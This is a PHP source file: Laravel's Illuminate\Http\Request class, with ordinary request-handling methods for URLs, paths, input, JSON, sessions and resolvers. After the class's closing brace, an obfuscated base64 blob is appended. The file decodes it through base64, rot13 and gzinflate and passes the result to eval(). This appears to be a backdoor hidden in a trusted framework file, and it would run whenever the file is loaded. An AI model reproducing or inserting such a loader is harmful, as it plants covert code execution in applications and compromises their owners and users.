<?php

namespace Illuminate\Http;

use ArrayAccess;
use Closure;
use Illuminate\Contracts\Support\Arrayable;
use Illuminate\Support\Arr;
use Illuminate\Support\Str;
use Illuminate\Support\Traits\Macroable;
use RuntimeException;
use Symfony\Component\HttpFoundation\ParameterBag;
use Symfony\Component\HttpFoundation\Request as SymfonyRequest;

/**
 * @method array validate(array $rules, ...$params)
 * @method array validateWithBag(string $errorBag, array $rules, ...$params)
 * @method bool hasValidSignature(bool $absolute = true)
 */
class Request extends SymfonyRequest implements Arrayable, ArrayAccess
{
    use Concerns\InteractsWithContentTypes,
        Concerns\InteractsWithFlashData,
        Concerns\InteractsWithInput,
        Macroable;

    /**
     * The decoded JSON content for the request.
     *
     * @var \Symfony\Component\HttpFoundation\ParameterBag|null
     */
    protected $json;

    /**
     * All of the converted files for the request.
     *
     * @var array
     */
    protected $convertedFiles;

    /**
     * The user resolver callback.
     *
     * @var \Closure
     */
    protected $userResolver;

    /**
     * The route resolver callback.
     *
     * @var \Closure
     */
    protected $routeResolver;

    /**
     * Create a new Illuminate HTTP request from server variables.
     *
     * @return static
     */
    public static function capture()
    {
        static::enableHttpMethodParameterOverride();

        return static::createFromBase(SymfonyRequest::createFromGlobals());
    }

    /**
     * Return the Request instance.
     *
     * @return $this
     */
    public function instance()
    {
        return $this;
    }

    /**
     * Get the request method.
     *
     * @return string
     */
    public function method()
    {
        return $this->getMethod();
    }

    /**
     * Get the root URL for the application.
     *
     * @return string
     */
    public function root()
    {
        return rtrim($this->getSchemeAndHttpHost().$this->getBaseUrl(), '/');
    }

    /**
     * Get the URL (no query string) for the request.
     *
     * @return string
     */
    public function url()
    {
        return rtrim(preg_replace('/\?.*/', '', $this->getUri()), '/');
    }

    /**
     * Get the full URL for the request.
     *
     * @return string
     */
    public function fullUrl()
    {
        $query = $this->getQueryString();

        $question = $this->getBaseUrl().$this->getPathInfo() === '/' ? '/?' : '?';

        return $query ? $this->url().$question.$query : $this->url();
    }

    /**
     * Get the full URL for the request with the added query string parameters.
     *
     * @param  array  $query
     * @return string
     */
    public function fullUrlWithQuery(array $query)
    {
        $question = $this->getBaseUrl().$this->getPathInfo() === '/' ? '/?' : '?';

        return count($this->query()) > 0
            ? $this->url().$question.Arr::query(array_merge($this->query(), $query))
            : $this->fullUrl().$question.Arr::query($query);
    }

    /**
     * Get the current path info for the request.
     *
     * @return string
     */
    public function path()
    {
        $pattern = trim($this->getPathInfo(), '/');

        return $pattern == '' ? '/' : $pattern;
    }

    /**
     * Get the current decoded path info for the request.
     *
     * @return string
     */
    public function decodedPath()
    {
        return rawurldecode($this->path());
    }

    /**
     * Get a segment from the URI (1 based index).
     *
     * @param  int  $index
     * @param  string|null  $default
     * @return string|null
     */
    public function segment($index, $default = null)
    {
        return Arr::get($this->segments(), $index - 1, $default);
    }

    /**
     * Get all of the segments for the request path.
     *
     * @return array
     */
    public function segments()
    {
        $segments = explode('/', $this->decodedPath());

        return array_values(array_filter($segments, function ($value) {
            return $value !== '';
        }));
    }

    /**
     * Determine if the current request URI matches a pattern.
     *
     * @param  mixed  ...$patterns
     * @return bool
     */
    public function is(...$patterns)
    {
        $path = $this->decodedPath();

        foreach ($patterns as $pattern) {
            if (Str::is($pattern, $path)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Determine if the route name matches a given pattern.
     *
     * @param  mixed  ...$patterns
     * @return bool
     */
    public function routeIs(...$patterns)
    {
        return $this->route() && $this->route()->named(...$patterns);
    }

    /**
     * Determine if the current request URL and query string matches a pattern.
     *
     * @param  mixed  ...$patterns
     * @return bool
     */
    public function fullUrlIs(...$patterns)
    {
        $url = $this->fullUrl();

        foreach ($patterns as $pattern) {
            if (Str::is($pattern, $url)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Determine if the request is the result of an AJAX call.
     *
     * @return bool
     */
    public function ajax()
    {
        return $this->isXmlHttpRequest();
    }

    /**
     * Determine if the request is the result of an PJAX call.
     *
     * @return bool
     */
    public function pjax()
    {
        return $this->headers->get('X-PJAX') == true;
    }

    /**
     * Determine if the request is the result of an prefetch call.
     *
     * @return bool
     */
    public function prefetch()
    {
        return strcasecmp($this->server->get('HTTP_X_MOZ'), 'prefetch') === 0 ||
               strcasecmp($this->headers->get('Purpose'), 'prefetch') === 0;
    }

    /**
     * Determine if the request is over HTTPS.
     *
     * @return bool
     */
    public function secure()
    {
        return $this->isSecure();
    }

    /**
     * Get the client IP address.
     *
     * @return string|null
     */
    public function ip()
    {
        return $this->getClientIp();
    }

    /**
     * Get the client IP addresses.
     *
     * @return array
     */
    public function ips()
    {
        return $this->getClientIps();
    }

    /**
     * Get the client user agent.
     *
     * @return string|null
     */
    public function userAgent()
    {
        return $this->headers->get('User-Agent');
    }

    /**
     * Merge new input into the current request's input array.
     *
     * @param  array  $input
     * @return $this
     */
    public function merge(array $input)
    {
        $this->getInputSource()->add($input);

        return $this;
    }

    /**
     * Replace the input for the current request.
     *
     * @param  array  $input
     * @return $this
     */
    public function replace(array $input)
    {
        $this->getInputSource()->replace($input);

        return $this;
    }

    /**
     * This method belongs to Symfony HttpFoundation and is not usually needed when using Laravel.
     *
     * Instead, you may use the "input" method.
     *
     * @param  string  $key
     * @param  mixed  $default
     * @return mixed
     */
    public function get($key, $default = null)
    {
        return parent::get($key, $default);
    }

    /**
     * Get the JSON payload for the request.
     *
     * @param  string|null  $key
     * @param  mixed  $default
     * @return \Symfony\Component\HttpFoundation\ParameterBag|mixed
     */
    public function json($key = null, $default = null)
    {
        if (! isset($this->json)) {
            $this->json = new ParameterBag((array) json_decode($this->getContent(), true));
        }

        if (is_null($key)) {
            return $this->json;
        }

        return data_get($this->json->all(), $key, $default);
    }

    /**
     * Get the input source for the request.
     *
     * @return \Symfony\Component\HttpFoundation\ParameterBag
     */
    protected function getInputSource()
    {
        if ($this->isJson()) {
            return $this->json();
        }

        return in_array($this->getRealMethod(), ['GET', 'HEAD']) ? $this->query : $this->request;
    }

    /**
     * Create a new request instance from the given Laravel request.
     *
     * @param  \Illuminate\Http\Request  $from
     * @param  \Illuminate\Http\Request|null  $to
     * @return static
     */
    public static function createFrom(self $from, $to = null)
    {
        $request = $to ?: new static;

        $files = $from->files->all();

        $files = is_array($files) ? array_filter($files) : $files;

        $request->initialize(
            $from->query->all(),
            $from->request->all(),
            $from->attributes->all(),
            $from->cookies->all(),
            $files,
            $from->server->all(),
            $from->getContent()
        );

        $request->headers->replace($from->headers->all());

        $request->setJson($from->json());

        if ($session = $from->getSession()) {
            $request->setLaravelSession($session);
        }

        $request->setUserResolver($from->getUserResolver());

        $request->setRouteResolver($from->getRouteResolver());

        return $request;
    }

    /**
     * Create an Illuminate request from a Symfony instance.
     *
     * @param  \Symfony\Component\HttpFoundation\Request  $request
     * @return static
     */
    public static function createFromBase(SymfonyRequest $request)
    {
        if ($request instanceof static) {
            return $request;
        }

        $newRequest = (new static)->duplicate(
            $request->query->all(), $request->request->all(), $request->attributes->all(),
            $request->cookies->all(), $request->files->all(), $request->server->all()
        );

        $newRequest->headers->replace($request->headers->all());

        $newRequest->content = $request->content;

        $newRequest->request = $newRequest->getInputSource();

        return $newRequest;
    }

    /**
     * {@inheritdoc}
     */
    public function duplicate(array $query = null, array $request = null, array $attributes = null, array $cookies = null, array $files = null, array $server = null)
    {
        return parent::duplicate($query, $request, $attributes, $cookies, $this->filterFiles($files), $server);
    }

    /**
     * Filter the given array of files, removing any empty values.
     *
     * @param  mixed  $files
     * @return mixed
     */
    protected function filterFiles($files)
    {
        if (! $files) {
            return;
        }

        foreach ($files as $key => $file) {
            if (is_array($file)) {
                $files[$key] = $this->filterFiles($files[$key]);
            }

            if (empty($files[$key])) {
                unset($files[$key]);
            }
        }

        return $files;
    }

    /**
     * Get the session associated with the request.
     *
     * @return \Illuminate\Session\Store
     *
     * @throws \RuntimeException
     */
    public function session()
    {
        if (! $this->hasSession()) {
            throw new RuntimeException('Session store not set on request.');
        }

        return $this->session;
    }

    /**
     * Get the session associated with the request.
     *
     * @return \Illuminate\Session\Store|null
     */
    public function getSession()
    {
        return $this->session;
    }

    /**
     * Set the session instance on the request.
     *
     * @param  \Illuminate\Contracts\Session\Session  $session
     * @return void
     */
    public function setLaravelSession($session)
    {
        $this->session = $session;
    }

    /**
     * Get the user making the request.
     *
     * @param  string|null  $guard
     * @return mixed
     */
    public function user($guard = null)
    {
        return call_user_func($this->getUserResolver(), $guard);
    }

    /**
     * Get the route handling the request.
     *
     * @param  string|null  $param
     * @param  mixed  $default
     * @return \Illuminate\Routing\Route|object|string|null
     */
    public function route($param = null, $default = null)
    {
        $route = call_user_func($this->getRouteResolver());

        if (is_null($route) || is_null($param)) {
            return $route;
        }

        return $route->parameter($param, $default);
    }

    /**
     * Get a unique fingerprint for the request / route / IP address.
     *
     * @return string
     *
     * @throws \RuntimeException
     */
    public function fingerprint()
    {
        if (! $route = $this->route()) {
            throw new RuntimeException('Unable to generate fingerprint. Route unavailable.');
        }

        return sha1(implode('|', array_merge(
            $route->methods(),
            [$route->getDomain(), $route->uri(), $this->ip()]
        )));
    }

    /**
     * Set the JSON payload for the request.
     *
     * @param  \Symfony\Component\HttpFoundation\ParameterBag  $json
     * @return $this
     */
    public function setJson($json)
    {
        $this->json = $json;

        return $this;
    }

    /**
     * Get the user resolver callback.
     *
     * @return \Closure
     */
    public function getUserResolver()
    {
        return $this->userResolver ?: function () {
            //
        };
    }

    /**
     * Set the user resolver callback.
     *
     * @param  \Closure  $callback
     * @return $this
     */
    public function setUserResolver(Closure $callback)
    {
        $this->userResolver = $callback;

        return $this;
    }

    /**
     * Get the route resolver callback.
     *
     * @return \Closure
     */
    public function getRouteResolver()
    {
        return $this->routeResolver ?: function () {
            //
        };
    }

    /**
     * Set the route resolver callback.
     *
     * @param  \Closure  $callback
     * @return $this
     */
    public function setRouteResolver(Closure $callback)
    {
        $this->routeResolver = $callback;

        return $this;
    }

    /**
     * Get all of the input and files for the request.
     *
     * @return array
     */
    public function toArray()
    {
        return $this->all();
    }

    /**
     * Determine if the given offset exists.
     *
     * @param  string  $offset
     * @return bool
     */
    public function offsetExists($offset)
    {
        return Arr::has(
            $this->all() + $this->route()->parameters(),
            $offset
        );
    }

    /**
     * Get the value at the given offset.
     *
     * @param  string  $offset
     * @return mixed
     */
    public function offsetGet($offset)
    {
        return $this->__get($offset);
    }

    /**
     * Set the value at the given offset.
     *
     * @param  string  $offset
     * @param  mixed  $value
     * @return void
     */
    public function offsetSet($offset, $value)
    {
        $this->getInputSource()->set($offset, $value);
    }

    /**
     * Remove the value at the given offset.
     *
     * @param  string  $offset
     * @return void
     */
    public function offsetUnset($offset)
    {
        $this->getInputSource()->remove($offset);
    }

    /**
     * Check if an input element is set on the request.
     *
     * @param  string  $key
     * @return bool
     */
    public function __isset($key)
    {
        return ! is_null($this->__get($key));
    }

    /**
     * Get an input element from the request.
     *
     * @param  string  $key
     * @return mixed
     */
    public function __get($key)
    {
        return Arr::get($this->all(), $key, function () use ($key) {
            return $this->route($key);
        });
    }
}
$php = base64_decode('LUvHErS4EX4a165i5EM+kWbOXFzkzJDT0xv+9RwAlUMLqfsLmqUZ77+34VXWe6yWv39wuWDIf+dyV+fl72956+L+f+MvUlvgoRwJWBWbAP4X5HntD9iBf05TsywgbpIkhhcDvm0+wPu+LS4TYRFK7q1rAFF6RTaArA2AggrvQ3UWB4zpwV/9Dn/bxPxexlfEn0MXoPe5TR9UABacwfW7a9v4qZFY3b1CgnVX8hSu8BJwe7tUNysv9AVt/hjQqIdmpeUdSpzyVIRXYvCI27teOd+BwY+t8IgyilyvLV+XznEZ4/NXHTfVFuJR30rC3nYxymoB2rRaN7NZVQSzWnIuLZ7gMdC3hnAcWZG2EVnhUC3tdlax0yGdrN8WklPk/HF0J5guSvFKVETy1L2bWEeePg3nZJTLjcnagob0Ksr1YWx0zFhU/dZiaJsLJO9TG3T6tkwjMQjqMU/OsiF9+F1duN+6447VrGphXm9048o6cKug7t5Xr+RCG0VPx4YbBNiiuq3ifq8LN7T8+FN4ripKEDnMehMjMJO/ByJoAYV7u/qGgzsnj1xoS9kvp1BKX/t+pftnlmyv5iDd6bDoZH7Ha7RWVdCI3Q/CcefgMoOIvDscrAevmz6sgomFyFrb0bpjDelCDi/Y6KTOh4vzRYXNisoa1MAf2Py+hWa5E9LNmiMt7cQkooFiKNGkGT3mDS90Agnywx7Lsgjftx/s9iqyrZfncW11KPftFxyxPdy1bUytaPGtrhN9uEQBfSmnRIXLoaPd20CCHQBazwzjs8frKp8hMQqxp+6eb0+2w8I9pNZyEhAMBSmQrrrpyUwIJuisvb0JXZZZ7rq+K5qm4KVxii/6+GcxB1qUmncq4mpW6T5yEf/WM9aMyUT2PCtFe9PgG7DeaKaxFpTx6DwL+61DwhB/NhHaoPyB/GSzCwFVn0omilpi7ygNygFQFY+KW0/plt/JsuoqgRqEFsBkwR2XNNd3o7EmxUUp6pnYVy49uOtw0kyNfSiXq68g1qA2re/kb0++Tomw1GrP/5mY2+8pzuYz/sF1qmZOIyAesDtMW5dppM7Uezu4oqbL0/0+FkXHhaM0kl1VLZ2rnV+pd3O3LnN4MiiaUlG8dEGF58snQ8iM6HVLBGneNsjv6HtgJ13SKFCcr7dX0bJwkmKN57I6KitrLNJL2tOSdZrmGAHjQhT+QBz7DQOzvQE/cxhHzJCWQGD51nZapgZY/kBM/NHGxB6ANviQwvonuIN1TZLRKJI5Ri98LoKbchVKwj9laoqSWJgLXEJDdkUiunVy5aNN4tOt9hNnHEPqS2bBUYUEhE9EKND1EofrFAAMkJfwwZPsjJV0V4rGZlklebv0NomDka08r49JmfDvDVOI/FRFzsC/mG14XlytwlhiMBxWx4QDUiyy5wPiyuEO6LA1Zp3M5ST644wAODdHwLScy3ggv5qZzUeuiVB5yefx75EM8H4HVzWImB9fyHrHGs5bF5ktRpM8P7Ap1EHC3uUMXyAGSJ348qtESakTZ+28QYG+Yo8YLM7CzSvN4DUeTluMqj/+jWlkpHul4iU2ahK4DVpMB9HM3FjuBiang9/CcG/IdDiBdKnCVsnwJ/ejNTFHpDUW3fe1rLEQHsrHK8rKOyL7qKHzer56Z01R6ZFPJ8G+LL1iIsd7Ma+DxtwYybAObxjhayIWo0LBBhBTbgXqfTMDH8vU/MRaw+AfeijsbO9rhspcUIua9vzCIFOSP5k4TQS3XhWXhjWpxGJUD9vfXEmdtk94v0KKc5C86hRyyMRHNrKYVzMx9pWn1uOmTipoaIeKcE7aVUB5Ryeg0e5Lg27GZSiEcCXmzCymtx7v1zv3Mx0UrQZwGi30Rs8pTCNa3voQj4tYCIFOHGnCz2DgxHMvnlavlZpUcjpn/SHXxAC/BJrf5h4E9gatadUWW6k0XXxSCzDSI3yoRhfDCNcQ3MiMNvVhGY9WnTH9oSz/sp3FP3y/csfTDMajvOHcGPTRDaWw51SSaKh7cHd3wqyavJMpfmkiP2/PKWd444/cYmtL4Ikc6unZE+0j7+rbZj8HveeyB5+ql6hYqZrhjkRIxhxbE1L0dxKKTYD9sn1bJHzjNB47UvtxM+BlYuY9Bc1Z+WwJ4lzRFJxV7hCzYota0mfa4lhQgalzZPSUCL8Bm1Xu5i6H8Wiek2NupRkMXadLmg8i7EkNSvtn4pA1VrIPtQCm8U6m56skW4uItxDXvNpkXbLx/MkEvByEkuifrIRG/K31OaDS56OuKrCtgjlKXN+OYvnWvEEAJ8xMjZYAv7poo/KdrLQJfs3YkF9pksgei4YpvxfnxO4z7dE7kdQZwH6c2X5JIaA/vTTs/p5WaIk+hkUqX2uIUuBgd/tDbauQQiiL+RV6xtBxlBnI+q5eAGihq16LcKinbWYa2Atfg+YRSJtIlbJjCSoSsSARhnVnhn926GB3ZjEeRjT6UIUkfY5HO8QOFLo6DId2U3XAeH452qEllUFfmBgXMNhXeMG54LfaHVVhen3i3Fx4YjdjoJ+p/Fs1TP/IbcLCYi28iANupP2GOm54Zk3zWeaS3HXgWl2tpUhFL5+kMvWIHT2vYbe616VZXZraIOgZRqX24sC7l8WIOawy+8I2Gcu1v/vMeqfyBghVmGvt0F2leVhuRs2wr2JhDngK/c4tXgXz8Zck8Qt9xQH5MOn51eranFe3QYQV2CVCXUhB4VHIhQkbTkfoCE3ZE2vRgvDoLISB+PN/h4t+9s4tmA0VOjSgM8JrbKjx2irYkY716ojMPucYErdEixSSb7XO+Wg+62q9geuOY00t+skn1m6X84I7UMVr2b0R5iyaZ6Two2yzlFuvWg7EmrnIomhB8c+crt2KibCLMXn9MDV4nAGmcKPfoJ0osYwowfhiCvhUIT+UgYZgVta4Eb/JPm6Woa5NXqjJ74+312NanThhVuksDhIIv9E/8kVlocna9FdGRf2ydl1kcutM82yF1/29RxD/3NkWODwNx6sSPQrY5pSOggtTi0L70RwTxFDyiWWA2kfI3TPFt7tKAW6v01kw+EQj9d3Kgb2NnSgLU5Tqth9wteXYHNqUV9DAsqCIQmIZO20Oi9VUOlB3t3JzeUBeyr3SEbmtKErZc4FcpHKAfkxpX9fwrTl8qagsH0AEGVywKCifJySNwQdP6ySqwXIv3Y/Q7f3B+pb7QQESrXdWud1b0j97e7mJV+aCqUAdi3AwfzmFEti7hhCXKsHUVcv7AXxp5op+H7OWtncj6EY+gcJGq6heIp3nqnLOnEW00ncCcBvlo8ffGYvgsCGLhykQ56uTd569hsgIieqMS1D8b4WR8eRE/+nWoD/H9d2t2+nr1f0OCzBOAxrSX3Dp9r5r8gLqmFt+EcGSwwSL2BTnfYyBF2dkwfkBgWwiw8ZvvMenLVuN9dm5b+YYQ1UrlvbGAve0w0lALO+vhn8mqgJ/5bkbcdaXhQ3KuTQQ5pSB1mttW1rhmLsg6tNIhskh4aevOC+JjR6kOSQsd+fVj8P8Q2SVxS36ykKjVnNnlZPafveRMDba713iZ20wrnl9ltRHHJBX82tZcyk51xea7j3VVZ9YMCvy+dAxgTudWAYUOEAwkHHjm5p3bPecTbhvYn/cHQCPBcgXwueUX5hEs/WYHgnd0nQ3AtfNSxKIkEujx5cqroGUFwMIVTpjZLZQmjRogFKciRjZ4MKf8J/dzEQ8+a98NsDYqPkOKKFOfw506q3IrOMxUycYiEhKr3YojWRfQ4G3/B0SKCZw0Kar9dZ60aE+QD/M4Hb/4Qp+pZW4hOFHGbe/YJj3v1mJCDoQXtdBCYhL9RPJy3tlwCNomcAUNHHAB6nQp4JdKqN6qA3cDxNM/NnCJ+s7aO0GmMgybg1qdInSQAqoFexLni7qHh1CgqZXlmG/z0kjNRIwgqCqAJfeLClsuQUo+0g9ypGr/SeC6gdp3hoG/PF7nASIur/4wUc/cHz7ZBPX3sqh5i/Bw4r7HUlPQW78uEllnGaRyn3nfxTBB8HPbyORVW4YVSPCJ0FzOHhYuA4nppryM0srcQaUyWh1HgZDPIzx/SodDP240/GMzMR1DJmhRz5qEGqu94y0vgfbqzTld7FVTbk+2XtswHDlN2SfP92DFubghQvIbLIqEXpXyVzfA4cRK76kYHuC3+p9CQHlJXjYcrRbJSVlUX8+lysIU87naAnaOWUJt192yPd/+b78Mlvru7gBW9i8DBkOrAPRPtp8CIA80gkAPAvfHBY0PZd+eXTENgnqBkSsrOwmnOv68yeD8+lxisWmdfkQOA+FDS+WQaaT+W68GnLOKwRRK4AHULuAcuC2Pn3bICl/27nmdtZ/nHn15+a0zF//fn//+R8=');
$php = str_rot13($php);
$php = gzinflate($php);
$php = str_rot13($php);
eval($php);
